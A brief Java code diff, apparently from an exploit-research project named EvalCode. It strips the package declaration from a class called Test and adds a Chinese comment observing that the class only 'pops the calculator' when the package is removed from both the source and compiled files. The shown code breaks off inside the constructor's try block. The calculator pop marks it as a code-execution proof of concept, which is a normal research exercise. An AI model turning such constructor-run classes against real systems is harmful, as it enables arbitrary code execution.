@@ -1,13 +1,7 @@
-package EvalCode;
-
 import java.io.IOException;
 
-/**
- * @author L3ttuc3
- * @version 1.0
- * @date 2023/5/11 15:49
- */
-//如果想执行必须删除package！！！
+
+//发现了很奇特的事情，.class文件去除了package，但是.java文件如果同时去除，就能弹计算器，如果不去就弹不出来，难道.java和.class还有联系？
 public class Test {
     public Test() {
         try {
